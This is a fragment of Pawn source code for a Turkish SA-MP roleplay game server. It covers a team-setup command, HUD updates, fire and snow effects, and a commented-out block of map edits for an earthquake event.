	new n_string[32], ekipno, _pid=-1 ,_sayi;
	sscanf(params, "s[32]ddd", n_string, ekipno, _pid, _sayi);
	if(isnull(n_string)) { Kullanim(playerid, "/ekip [fonksiyon]"); SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: kur, liste, sil"); return 1; }
	if(Buysa(n_string, "kur")) {
	    if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Araçta olmanýz gerekmektedir.");
		new vid=GetPlayerVehicleID(playerid);
		if(Arac[vid][abirliktip] != 1) return Hata(playerid, "Bu araçta ekip kuramazsýnýz.");
		for(new i=0;i<MAX_EKIP;i++) {
			if(Ekip[i][oyuncu_1] == Karakter[playerid][sqlid]) {
				Hata(playerid, "Kurulmuþ bir ekibiniz bulunmaktadýr.");
				return 1;
			}
		}
		if(ekipno < 1 || ekipno > 11) return Kullanim(playerid, "/ekip kur [1(ADAM)/ 2(LINCOLN)/ 3(TOM)/ 4(TOMLINCOLN)/ 5(AIR)/ 6(MARY)/ 7(DAVID)/ 8(WILLIAM)/ 9(EDWARD)] [oyuncuID] [KOD] ");
		if(_pid == -1) return Kullanim(playerid, "/ekip kur [1(ADAM)/ 2(LINCOLN)/ 3(TOM)/ 4(TOMLINCOLN)/ 5(AIR)/ 6(MARY)/ 7(DAVID)/ 8(WILLIAM)/ 9(EDWARD)] [oyuncuID] [KOD] ");
		if(!Girdi[_pid]) return Kullanim(playerid, "/ekip kur [1(ADAM)/ 2(LINCOLN)/ 3(TOM)/ 4(TOMLINCOLN)/ 5(AIR)/ 6(MARY)/ 7(DAVID)/ 8(WILLIAM)/ 9(EDWARD)] [oyuncuID] [KOD] ");
		for(new i;i<MAX_EKIP;i++) {
			if(Ekip[i][no] == 0) {
			    Ekip[i][no] = _sayi;
			    Ekip[i][etip] = ekipno;
			    new ch[4];
			    switch(Ekip[i][etip]) {
					case 1: ch = "A";
					case 2: ch = "L";
					case 3: ch = "T";
					case 4: ch = "TL";
					case 5: ch = "AIR";
					case 6: ch = "M";
					case 7: ch = "D";
					case 8: ch = "W";
					case 9: ch = "E";
					case 10: ch = "K9";
					case 11: ch = "Q";
				}
			    Ekip[i][oyuncu_1] = Karakter[playerid][sqlid];
				Ekip[i][oyuncu_2] = Karakter[_pid][sqlid];
				format(n_string, 32, "1-%s-%d", ch, Ekip[i][no]);
				UpdateDynamic3DTextLabelText(Plaka3DText[vid], 0xFFFFFFFF, n_string);
				break;
			}
		}
		Bilgi(playerid, "Baþarýyla ekip kurdunuz.");
	}
	else if(Buysa(n_string, "liste")) {
		Bilgi(playerid, ""C7"| Kurulu Ekipler |");
		new say=0;
        for(new i;i<MAX_EKIP;i++) {
			if(Ekip[i][no] != 0) {
				say++;
			    new ch[4];
			    switch(Ekip[i][etip]) {
					case 1: ch = "A";
					case 2: ch = "L";
					case 3: ch = "T";
					case 4: ch = "TL";
					case 5: ch = "AIR";
					case 6: ch = "M";
					case 7: ch = "D";
					case 8: ch = "W";
					case 9: ch = "E";
					case 10: ch = "K9";
					case 11: ch = "Q";
				}
				if(Ekip[i][oyuncu_1] == Ekip[i][oyuncu_2]) {
				SendClientMessageEx(playerid, -1, "{3e5171}1-%s-%d,{FFFFFF} %s", ch, Ekip[i][no], SQLFromName(Ekip[i][oyuncu_1]));
				}
				else {
				SendClientMessageEx(playerid, -1, "{3e5171}1-%s-%d,{FFFFFF} %s, %s", ch, Ekip[i][no], SQLFromName(Ekip[i][oyuncu_1]), SQLFromName(Ekip[i][oyuncu_2]));
				}
			}
		}
		if(!say) return Hata(playerid, "Kurulmuþ bir ekip bulunmamaktadýr.");
	}
	else if(Buysa(n_string, "sil")) {
		for(new i;i<MAX_EKIP;i++) {
			if(Ekip[i][oyuncu_1] == Karakter[playerid][sqlid]) {
			    Ekip[i][no] = 0;
			    Ekip[i][etip] = 0;
			    Ekip[i][oyuncu_1] = 0;
			    Ekip[i][oyuncu_2] = 0;
				Bilgi(playerid, "Ekibi sildiniz.");
				return 1;
			}
		}
		Hata(playerid, "Herhangi bir ekip kurmamýþsýnýz.");
	}
	else { Kullanim(playerid, "/ekip [fonksiyon]"); SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: kur, liste, sil"); return 1; }
	return 1;
}

SagAltGoster(playerid, tip) {
	if(tip == 1) {
		TextDrawHideForPlayer(playerid, SagAlt[3]);
        TextDrawShowForPlayer(playerid, SagAlt[0]);
        PlayerTextDrawSetString(playerid, CanTD[playerid], CanEx(playerid));
		PlayerTextDrawShow(playerid, CanTD[playerid]);
		PlayerTextDrawSetString(playerid, ZirhTD[playerid], ZirhEx(playerid));
		PlayerTextDrawShow(playerid, ZirhTD[playerid]);
		static day, year, month, hours, minute, sec, mmstring[128];
		getdate(year, month, day);
		gettime(hours, minute, sec);
	 	format(mmstring, sizeof(mmstring), "%02d-%02d-%02d_%02d:%02d", day, month, year-2000, hours, minute);
		PlayerTextDrawSetString(playerid, SaatTD[playerid], mmstring);
		PlayerTextDrawShow(playerid, SaatTD[playerid]);
		format(mmstring, sizeof(mmstring), "$%d", Karakter[playerid][banka]);
  		PlayerTextDrawSetString(playerid, BankaParaTD[playerid], mmstring);
		PlayerTextDrawShow(playerid, BankaParaTD[playerid]);
		format(mmstring, sizeof(mmstring), "%ddk", Karakter[playerid][payday]);
	  	PlayerTextDrawSetString(playerid, PaydaySureTD[playerid], mmstring);
		PlayerTextDrawShow(playerid, PaydaySureTD[playerid]);
	}
	if(tip == 2) {
		TextDrawHideForPlayer(playerid, SagAlt[0]);
        TextDrawShowForPlayer(playerid, SagAlt[3]);
        PlayerTextDrawSetString(playerid, CanTD[playerid], CanEx(playerid));
		PlayerTextDrawShow(playerid, CanTD[playerid]);
		PlayerTextDrawSetString(playerid, ZirhTD[playerid], ZirhEx(playerid));
		PlayerTextDrawShow(playerid, ZirhTD[playerid]);
		static day, year, month, hours, minute, sec, mmstring[128];
		getdate(year, month, day);
		gettime(hours, minute, sec);
	 	format(mmstring, sizeof(mmstring), "%02d-%02d-%02d_%02d:%02d", day, month, year-2000, hours, minute);
		PlayerTextDrawSetString(playerid, SaatTD[playerid], mmstring);
		PlayerTextDrawShow(playerid, SaatTD[playerid]);
		format(mmstring, sizeof(mmstring), "$%d", Karakter[playerid][banka]);
  		PlayerTextDrawSetString(playerid, BankaParaTD[playerid], mmstring);
		PlayerTextDrawShow(playerid, BankaParaTD[playerid]);
		format(mmstring, sizeof(mmstring), "%ddk", Karakter[playerid][payday]);
	  	PlayerTextDrawSetString(playerid, PaydaySureTD[playerid], mmstring);
		PlayerTextDrawShow(playerid, PaydaySureTD[playerid]);
	}
}

AramaEkrani(playerid, tur = 0)
{
	for(new a; a < sizeof(rty[]);a++)PlayerTextDrawShow(playerid,rty[playerid][a]);
   	for(new a; a < sizeof(qwe[]);a++)PlayerTextDrawHide(playerid,qwe[playerid][a]);
   	if(!tur)SelectTextDraw(playerid, 0xBB252566);
}

CreateFire(Float:x, Float:y, Float:z, Float:rz)
{
	new
		fire_objMid1,
		fire_objMid2,
		fire_objMid3,
		fire_objMid4,
		fire_objStick1,
		fire_objStick2,
		fire_objStick3,
		fire_objStick4,
		fire_objStick5,
		fire_objStick6,
		fire_objStick7,
		fire_objStick8;

	fire_objMid1 = CreateDynamicObject(19475, x, y, z, 10.0, 90.0, rz + 18.0);
	fire_objMid2 = CreateDynamicObject(19475, x, y, z, -10.0, 90.0, rz + 36.0);
	fire_objMid3 = CreateDynamicObject(19475, x, y, z, 0.0, 100.0, rz + 54.0);
	fire_objMid4 = CreateDynamicObject(19475, x, y, z, 0.0, 80.0, rz + 72.0);


	fire_objStick1 = CreateDynamicObject(19475,
		x + (0.1 * floatsin(-rz, degrees)),
		y + (0.1 * floatcos(-rz, degrees)),
		z + 0.01,
		10.0, 80.0, rz + 45.0);

	fire_objStick2 = CreateDynamicObject(19475,
		x + (0.1 * floatsin(-rz - 90.0, degrees)),
		y + (0.1 * floatcos(-rz - 90.0, degrees)),
		z + 0.01,
		10.0, 80.0, rz + 45.0 + 90.0);

	fire_objStick3 = CreateDynamicObject(19475,
		x + (0.1 * floatsin(-rz - 180.0, degrees)),
		y + (0.1 * floatcos(-rz - 180.0, degrees)),
		z + 0.01,
		10.0, 80.0, rz + 45.0 + 180.0);

	fire_objStick4 = CreateDynamicObject(19475,
		x + (0.1 * floatsin(-rz - 270.0, degrees)),
		y + (0.1 * floatcos(-rz - 270.0, degrees)),
		z + 0.01,
		10.0, 80.0, rz + 45.0 + 270.0);

	fire_objStick5 = CreateDynamicObject(19475,
		x + (0.1 * floatsin(-rz, degrees)),
		y + (0.1 * floatcos(-rz, degrees)),
		z + 0.01,
		10.0, 80.0, rz + random(90));

	fire_objStick6 = CreateDynamicObject(19475,
		x + (0.1 * floatsin(-rz - 90.0, degrees)),
		y + (0.1 * floatcos(-rz - 90.0, degrees)),
		z + 0.01,
		10.0, 80.0, rz + random(90) + 90.0);

	fire_objStick7 = CreateDynamicObject(19475,
		x + (0.1 * floatsin(-rz - 180.0, degrees)),
		y + (0.1 * floatcos(-rz - 180.0, degrees)),
		z + 0.01,
		10.0, 80.0, rz + random(90) + 180.0);

	fire_objStick8 = CreateDynamicObject(19475,
		x + (0.1 * floatsin(-rz - 270.0, degrees)),
		y + (0.1 * floatcos(-rz - 270.0, degrees)),
		z + 0.01,
		10.0, 80.0, rz + random(90) + 270.0);


	SetDynamicObjectMaterial(fire_objMid1, 0, TEXTURE_1, 0);
	SetDynamicObjectMaterial(fire_objMid2, 0, TEXTURE_1, 0);
	SetDynamicObjectMaterial(fire_objMid3, 0, TEXTURE_1, 0);
	SetDynamicObjectMaterial(fire_objMid4, 0, TEXTURE_1, 0);

	SetDynamicObjectMaterial(fire_objStick1, 0, TEXTURE_2, 0);
	SetDynamicObjectMaterial(fire_objStick2, 0, TEXTURE_2, 0);
	SetDynamicObjectMaterial(fire_objStick3, 0, TEXTURE_2, 0);
	SetDynamicObjectMaterial(fire_objStick4, 0, TEXTURE_2, 0);

	SetDynamicObjectMaterial(fire_objStick5, 0, TEXTURE_2, 0);
	SetDynamicObjectMaterial(fire_objStick6, 0, TEXTURE_2, 0);
	SetDynamicObjectMaterial(fire_objStick7, 0, TEXTURE_2, 0);
	SetDynamicObjectMaterial(fire_objStick8, 0, TEXTURE_2, 0);

	CreateDynamicObject(18693,
		x - (0.0 * floatsin(-rz, degrees)),
		y - (0.0 * floatcos(-rz, degrees)),
		z - 1.5, 0.0, 0.0, rz);
}

CMD:karac(playerid, params[])
{
    if(Karakter[playerid][adminlevel] < 6) return 0;
	foreach(new i : Player)
    {
        if(snowOn[i]) continue;
        CreateSnow(i);
    }
	Bilgi(playerid, "Karý baþlattýnýz.");
	return 1;
}

CMD:karkapat(playerid, params[])
{
    if(Karakter[playerid][adminlevel] < 6) return 0;
	foreach(new i : Player)
    {
        if(!snowOn[i]) continue;
        DeleteSnow(i);
    }
	Bilgi(playerid, "Karý durdurdunuz.");
	return 1;
}

CreateSnow(playerid)
{
	if(snowOn[playerid]) return 0;
    new Float:pPos[3];
    GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
    for(new i = 0; i < MAX_SNOW_OBJECTS; i++) snowObject[playerid][i] = CreateDynamicObject(18864, pPos[0] + random(25), pPos[1] + random (25), pPos[2] - 5 + random(10), random(280), random(280), random(280), 0, -1, playerid);
    snowOn[playerid] = true;
    updateTimer[playerid] = SetTimerEx("UpdateSnow", UPDATE_INTERVAL, true, "i", playerid);
    return 1;
}
/*depremvakti(playerid)
	{
	    //star caddesi
		RemoveBuildingForPlayer(playerid, 5876, 1022.5313, -1096.3672, 34.6250, 0.25);
		RemoveBuildingForPlayer(playerid, 5939, 1037.7266, -1167.4063, 26.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 5940, 1013.7344, -1167.3672, 35.0391, 0.25);
		RemoveBuildingForPlayer(playerid, 5966, 1027.2656, -1113.0078, 36.1641, 0.25);
		RemoveBuildingForPlayer(playerid, 5990, 1003.5859, -1156.7266, 38.0703, 0.25);
		RemoveBuildingForPlayer(playerid, 5721, 1037.7266, -1167.4063, 26.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 5724, 1013.7344, -1167.3672, 35.0391, 0.25);
		RemoveBuildingForPlayer(playerid, 717, 1038.0781, -1155.3750, 23.0000, 0.25);
		RemoveBuildingForPlayer(playerid, 1223, 1032.1641, -1135.6641, 22.8125, 0.25);
		RemoveBuildingForPlayer(playerid, 5716, 1027.2656, -1113.0078, 36.1641, 0.25);
		CreatePlayerObject(playerid,5721, 1034.92468, -1167.79578, 26.34740,   1.00000, -10.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1034.86841, -1164.47070, 23.63456,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1042.52759, -1166.59143, 23.63456,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,5716, -7089.86816, 2494.54077, -4905.23779,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,5716, 1027.16003, -1111.28552, 33.16580,   -9.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,5724, 1012.41223, -1164.87646, 31.40830,   -16.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1015.79395, -1160.53235, 22.65890,   0.00000, 0.00000, 337.96674);
		CreatePlayerObject(playerid,10984, 1001.05304, -1154.63684, 22.65890,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1010.31708, -1155.46436, 22.65890,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,849, 1003.39178, -1145.83960, 22.99323,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,849, 995.13831, -1138.28894, 22.99323,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,853, 1007.70746, -1140.88733, 23.02802,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,685, 1002.03168, -1140.10449, 22.34759,   43.00000, 0.00000, 0.00000);
	    //santamariayolu
		RemoveBuildingForPlayer(playerid, 17002, 52.8906, -1532.0313, 7.7422, 0.25);
		RemoveBuildingForPlayer(playerid, 4504, 56.3828, -1531.4531, 6.7266, 0.25);
		CreatePlayerObject(playerid,17002, 48.21989, -1553.38855, 2.60432,   23.00000, 0.00000, 352.08191);
		CreatePlayerObject(playerid,707, 45.75622, -1540.07983, 5.23438,   85.00000, 0.00000, 140.13782);
		CreatePlayerObject(playerid,702, 83.49423, -1530.63562, 1.53396,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,705, 82.77819, -1546.31128, 4.99950,   91.00000, 0.00000, 206.12112);
		CreatePlayerObject(playerid,10984, 85.53558, -1559.15369, 5.31148,   0.00000, 0.00000, 301.76215);
		CreatePlayerObject(playerid,10984, 83.01501, -1546.69446, 5.64954,   0.00000, 0.00000, 0.00000);
		//willowfield
		RemoveBuildingForPlayer(playerid, 3748, 2238.2188, -1916.1094, 15.1875, 0.25);
		RemoveBuildingForPlayer(playerid, 3748, 2261.4609, -1916.0313, 15.1875, 0.25);
		RemoveBuildingForPlayer(playerid, 3748, 2284.7031, -1915.8750, 15.1797, 0.25);
		RemoveBuildingForPlayer(playerid, 3628, 2238.2188, -1916.1094, 15.1875, 0.25);
		RemoveBuildingForPlayer(playerid, 3628, 2261.4609, -1916.0313, 15.1875, 0.25);
		RemoveBuildingForPlayer(playerid, 3628, 2284.7031, -1915.8750, 15.1797, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 2240.7969, -1900.1328, 10.8047, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 2265.2891, -1900.1328, 10.8047, 0.25);
		CreatePlayerObject(playerid,3887, 2262.57178, -1913.29224, 19.24756,   0.00000, 0.00000, 88.73683);
		CreatePlayerObject(playerid,620, 2267.55176, -1902.24023, 9.81440,   33.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,620, 2248.45313, -1903.34753, 12.52470,   -272.00000, 0.00000, 231.70901);
	    //jefferson2
		RemoveBuildingForPlayer(playerid, 17535, 2364.0547, -1391.5313, 41.3516, 0.25);
		RemoveBuildingForPlayer(playerid, 17966, 2347.9219, -1364.2891, 27.1563, 0.25);
		RemoveBuildingForPlayer(playerid, 1261, 2369.2422, -1403.8672, 41.0391, 0.25);
		RemoveBuildingForPlayer(playerid, 1266, 2356.5781, -1454.6484, 36.2734, 0.25);
		RemoveBuildingForPlayer(playerid, 17970, 2364.0547, -1391.5313, 41.3516, 0.25);
		RemoveBuildingForPlayer(playerid, 1267, 2369.2422, -1403.8672, 41.0391, 0.25);
		RemoveBuildingForPlayer(playerid, 17542, 2347.9219, -1364.2891, 27.1563, 0.25);
		RemoveBuildingForPlayer(playerid, 955, 2352.1797, -1357.1563, 23.7734, 0.25);
		CreatePlayerObject(playerid,1267, 2355.96631, -1387.00635, 32.01400,   -140.00000, -170.00000, 10.27370);
		CreatePlayerObject(playerid,17542, 2350.46777, -1362.21509, 27.23210,   -4.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 2356.92090, -1369.93701, 22.99562,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 2356.92090, -1369.93701, 22.99562,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 2358.62891, -1360.91821, 23.02058,   0.00000, 0.00000, 34.04379);
		CreatePlayerObject(playerid,10984, 2345.35156, -1363.64868, 23.02058,   0.00000, 0.00000, 8.30533);
		CreatePlayerObject(playerid,10984, 2349.21826, -1371.00635, 23.02058,   0.00000, 0.00000, 34.04379);
	    //jefferson
		RemoveBuildingForPlayer(playerid, 5611, 2223.2656, -1202.1875, 27.6484, 0.25);
		RemoveBuildingForPlayer(playerid, 5612, 2222.9922, -1162.6016, 30.0391, 0.25);
		RemoveBuildingForPlayer(playerid, 5632, 2161.0781, -1131.6797, 31.1172, 0.25);
		RemoveBuildingForPlayer(playerid, 5638, 2184.5000, -1179.3281, 36.4063, 0.25);
		RemoveBuildingForPlayer(playerid, 1527, 2224.7656, -1193.0625, 25.8359, 0.25);
		RemoveBuildingForPlayer(playerid, 1226, 2189.6094, -1197.0234, 27.3281, 0.25);
		RemoveBuildingForPlayer(playerid, 700, 2190.3359, -1203.5000, 23.1953, 0.25);
		RemoveBuildingForPlayer(playerid, 1687, 2190.0313, -1180.6484, 33.2656, 0.25);
		RemoveBuildingForPlayer(playerid, 1687, 2190.0313, -1169.4375, 33.2656, 0.25);
		RemoveBuildingForPlayer(playerid, 1687, 2200.4297, -1189.9844, 33.2656, 0.25);
		RemoveBuildingForPlayer(playerid, 1687, 2197.0313, -1161.3828, 33.2656, 0.25);
		RemoveBuildingForPlayer(playerid, 1226, 2209.3125, -1197.5469, 28.5859, 0.25);
		RemoveBuildingForPlayer(playerid, 1687, 2208.7344, -1183.9609, 33.2734, 0.25);
		RemoveBuildingForPlayer(playerid, 700, 2209.3125, -1207.0391, 23.0000, 0.25);
		RemoveBuildingForPlayer(playerid, 1290, 2216.6797, -1175.8125, 30.5547, 0.25);
		RemoveBuildingForPlayer(playerid, 1687, 2218.8672, -1190.1328, 33.3125, 0.25);
		RemoveBuildingForPlayer(playerid, 5406, 2223.2656, -1202.1875, 27.6484, 0.25);
		RemoveBuildingForPlayer(playerid, 5413, 2222.9922, -1162.6016, 30.0391, 0.25);
		RemoveBuildingForPlayer(playerid, 1687, 2226.5234, -1183.9688, 33.2891, 0.25);
		RemoveBuildingForPlayer(playerid, 1493, 2233.7188, -1160.5547, 24.8672, 0.25);
		RemoveBuildingForPlayer(playerid, 673, 2233.3594, -1205.5234, 22.0938, 0.25);
		RemoveBuildingForPlayer(playerid, 1493, 2192.3281, -1150.8359, 32.7813, 0.25);
		RemoveBuildingForPlayer(playerid, 1290, 2217.1953, -1152.7031, 30.5547, 0.25);
		RemoveBuildingForPlayer(playerid, 1311, 2240.7891, -1140.3438, 28.9922, 0.25);
		RemoveBuildingForPlayer(playerid, 1689, 2243.0547, -1190.0781, 33.6953, 0.25);
		RemoveBuildingForPlayer(playerid, 673, 2252.7813, -1189.3828, 24.7344, 0.25);
		RemoveBuildingForPlayer(playerid, 673, 2257.5547, -1197.5156, 22.0938, 0.25);
		RemoveBuildingForPlayer(playerid, 1308, 2261.0859, -1182.7578, 24.5156, 0.25);
		RemoveBuildingForPlayer(playerid, 700, 2259.4141, -1189.7266, 25.1328, 0.25);
		RemoveBuildingForPlayer(playerid, 673, 2251.1719, -1166.2422, 24.7344, 0.25);
		RemoveBuildingForPlayer(playerid, 1308, 2250.5469, -1151.4844, 24.5156, 0.25);
		RemoveBuildingForPlayer(playerid, 700, 2252.2969, -1178.2813, 25.1328, 0.25);
		RemoveBuildingForPlayer(playerid, 700, 2255.5078, -1170.4531, 25.1328, 0.25);
		RemoveBuildingForPlayer(playerid, 673, 2256.3828, -1178.2031, 24.7344, 0.25);
		CreatePlayerObject(playerid,1311, 2235.04443, -1138.21655, 25.23626,   86.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,6959, 2205.65137, -1191.22827, 23.11406,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,6959, 2205.65137, -1191.22827, 23.11406,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,6959, 2242.37036, -1191.61829, 23.04643,   0.00000, 0.00000, 356.75153);
		CreatePlayerObject(playerid,6959, 2205.61255, -1151.28894, 23.15360,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,6959, 2246.78833, -1160.97107, 23.15364,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,3887, 2193.22314, -1184.40381, 30.15401,   0.00000, 0.00000, 359.46512);
		CreatePlayerObject(playerid,3866, 2215.53052, -1168.85156, 19.75350,   -222.00000, -51.00000, 90.00000);
		CreatePlayerObject(playerid,3887, 2251.40259, -1181.51306, 30.15401,   0.00000, 0.00000, 179.93962);
		CreatePlayerObject(playerid,3866, 2200.70068, -1148.62500, 30.61408,   0.00000, 0.00000, 340.64630);
		CreatePlayerObject(playerid,10984, 2188.52368, -1155.94910, 23.92813,   0.00000, 0.00000, 192.66203);
		CreatePlayerObject(playerid,10984, 2268.43066, -1155.49768, 24.94937,   0.00000, 0.00000, 66.88338);
		CreatePlayerObject(playerid,10984, 2227.93848, -1145.76855, 23.92813,   0.00000, 0.00000, 95.88276);
		CreatePlayerObject(playerid,10984, 2201.44409, -1139.76965, 23.92813,   0.00000, 0.00000, 95.88276);
		CreatePlayerObject(playerid,10984, 2244.28931, -1150.36951, 23.92813,   0.00000, 0.00000, 66.88338);
		CreatePlayerObject(playerid,10984, 2251.14209, -1153.08057, 24.33417,   0.00000, 0.00000, 66.88338);
		CreatePlayerObject(playerid,10984, 2219.31470, -1144.86755, 23.92813,   0.00000, 0.00000, 95.88276);
		CreatePlayerObject(playerid,10984, 2244.54468, -1206.57666, 23.92813,   0.00000, 0.00000, 246.72023);
		CreatePlayerObject(playerid,10984, 2187.76489, -1133.97522, 23.92813,   0.00000, 0.00000, 95.88276);
		CreatePlayerObject(playerid,10984, 2190.04785, -1145.49377, 23.92813,   0.00000, 0.00000, 192.66203);
		CreatePlayerObject(playerid,10984, 2235.40820, -1149.19592, 23.92813,   0.00000, 0.00000, 66.88338);
		CreatePlayerObject(playerid,10984, 2253.69849, -1175.02380, 23.92813,   0.00000, 0.00000, 66.88338);
		CreatePlayerObject(playerid,10984, 2255.46533, -1184.46790, 23.92813,   0.00000, 0.00000, 66.88338);
		CreatePlayerObject(playerid,10984, 2256.36865, -1198.42944, 23.92813,   0.00000, 0.00000, 66.88338);
		CreatePlayerObject(playerid,10984, 2255.36572, -1203.61035, 23.92813,   0.00000, 0.00000, 66.88338);
		CreatePlayerObject(playerid,3866, 2228.66162, -1197.55298, 29.89270,   1.00000, 0.00000, 90.00000);
		//ganton gym
		RemoveBuildingForPlayer(playerid, 17758, 2260.0000, -1707.7344, 17.1719, 0.25);
		RemoveBuildingForPlayer(playerid, 1498, 2229.6641, -1720.4219, 12.5547, 0.25);
		RemoveBuildingForPlayer(playerid, 1311, 2234.7500, -1737.4766, 16.5547, 0.25);
		RemoveBuildingForPlayer(playerid, 1226, 2267.7109, -1727.8359, 16.4219, 0.25);
		RemoveBuildingForPlayer(playerid, 17515, 2260.0000, -1707.7344, 17.1719, 0.25);
		CreatePlayerObject(playerid,17515, 2259.71582, -1707.80457, 17.30690,   -4.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 2293.10742, -1715.77258, 13.05857,   0.00000, 0.00000, 3.10001);
		CreatePlayerObject(playerid,10984, 2231.36230, -1717.28918, 13.15004,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 2240.37354, -1720.36023, 13.05857,   0.00000, 0.00000, 344.47177);
		CreatePlayerObject(playerid,10984, 2246.40674, -1719.90735, 13.05857,   0.00000, 0.00000, 344.47177);
		CreatePlayerObject(playerid,10984, 2255.23291, -1723.67480, 13.05857,   0.00000, 0.00000, 344.47177);
		CreatePlayerObject(playerid,10984, 2264.07153, -1722.90356, 13.05857,   0.00000, 0.00000, 1.50963);
		CreatePlayerObject(playerid,10984, 2275.84912, -1722.07642, 13.05857,   0.00000, 0.00000, 353.62250);
		CreatePlayerObject(playerid,10984, 2288.09497, -1723.36084, 13.05857,   0.00000, 0.00000, 3.10001);
		CreatePlayerObject(playerid,3887, 2262.36157, -1729.58813, 12.35690,   0.00000, 62.00000, 90.00000);
		// Rennie Role Play - Deprem Event Haritalar - Certain - Yusuf Ziya CIVAN

		// ------- BENZÝNLÝK VE GANTON PALMÝYELERÝ ---------

		RemoveBuildingForPlayer(playerid, 5535, 1918.8516, -1776.3281, 16.9766, 0.25);
		RemoveBuildingForPlayer(playerid, 5409, 1918.8516, -1776.3281, 16.9766, 0.25);
		RemoveBuildingForPlayer(playerid, 1676, 1941.6563, -1778.4531, 14.1406, 0.25);
		RemoveBuildingForPlayer(playerid, 1676, 1941.6563, -1774.3125, 14.1406, 0.25);
		RemoveBuildingForPlayer(playerid, 955, 1928.7344, -1772.4453, 12.9453, 0.25);
		RemoveBuildingForPlayer(playerid, 1676, 1941.6563, -1771.3438, 14.1406, 0.25);
		RemoveBuildingForPlayer(playerid, 1676, 1941.6563, -1767.2891, 14.1406, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 2208.9375, -1747.6328, 12.0938, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 2210.3281, -1715.7578, 12.0938, 0.25);
		CreatePlayerObject(playerid,620, 2208.96948, -1749.08350, 12.29158,   -88.07999, -2.58000, 28.47180);
		CreatePlayerObject(playerid,1311, 2234.75000, -1737.47656, 16.55469,   356.85840, 0.00000, -1.57080);
		CreatePlayerObject(playerid,620, 2209.67065, -1719.41455, 12.46166,   90.00001, -3.30000, 342.22507);
		CreatePlayerObject(playerid,5409, 1918.70081, -1775.68799, 15.95563,   2.94000, -0.48000, 0.00000);
		CreatePlayerObject(playerid,1676, 1941.71069, -1778.14380, 13.78908,   9.18000, -0.90000, 0.00000);
		CreatePlayerObject(playerid,1676, 1942.03857, -1773.98865, 12.84643,   89.15999, -0.96000, 56.40377);
		CreatePlayerObject(playerid,10984, 1920.15674, -1771.65967, 13.72696,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1920.15674, -1771.65967, 13.72696,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1918.72803, -1784.89270, 12.70215,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,955, 1928.64929, -1773.39172, 12.97582,   -88.92004, 49.80001, 307.60745);

		//--------------------------------------------

		//--------------- IDLEWOOD BÖLGESÝ ---------------

		RemoveBuildingForPlayer(playerid, 5526, 2049.5781, -1781.6797, 18.3281, 0.25);
		RemoveBuildingForPlayer(playerid, 5527, 2056.9844, -1830.5156, 20.6016, 0.25);
		RemoveBuildingForPlayer(playerid, 5540, 2101.2969, -1688.7734, 18.0859, 0.25);
		RemoveBuildingForPlayer(playerid, 1261, 2062.0313, -1826.6406, 19.9922, 0.25);
		RemoveBuildingForPlayer(playerid, 1268, 2030.9297, -1763.1641, 28.5781, 0.25);
		RemoveBuildingForPlayer(playerid, 1268, 2066.8125, -1791.7891, 21.9766, 0.25);
		RemoveBuildingForPlayer(playerid, 1268, 2128.2344, -1780.7109, 23.8750, 0.25);
		RemoveBuildingForPlayer(playerid, 5532, 2056.9844, -1830.5156, 20.6016, 0.25);
		RemoveBuildingForPlayer(playerid, 1267, 2062.0313, -1826.6406, 19.9922, 0.25);
		RemoveBuildingForPlayer(playerid, 1259, 2030.9297, -1763.1641, 28.5781, 0.25);
		RemoveBuildingForPlayer(playerid, 5522, 2048.7188, -1776.4766, 18.6484, 0.25);
		RemoveBuildingForPlayer(playerid, 5521, 2049.5781, -1781.6797, 18.3281, 0.25);
		RemoveBuildingForPlayer(playerid, 673, 2049.0547, -1733.7813, 12.0938, 0.25);
		RemoveBuildingForPlayer(playerid, 5422, 2071.4766, -1831.4219, 14.5625, 0.25);
		RemoveBuildingForPlayer(playerid, 1259, 2066.8125, -1791.7891, 21.9766, 0.25);
		RemoveBuildingForPlayer(playerid, 1522, 2070.2109, -1794.5938, 12.5234, 0.25);
		RemoveBuildingForPlayer(playerid, 1522, 2068.1641, -1780.6094, 12.5391, 0.25);
		RemoveBuildingForPlayer(playerid, 1216, 2069.0000, -1766.6641, 13.2109, 0.25);
		RemoveBuildingForPlayer(playerid, 1216, 2068.9375, -1767.8359, 13.2109, 0.25);
		RemoveBuildingForPlayer(playerid, 1283, 2069.2578, -1752.9141, 15.6953, 0.25);
		RemoveBuildingForPlayer(playerid, 1226, 2093.9297, -1762.6406, 16.4063, 0.25);
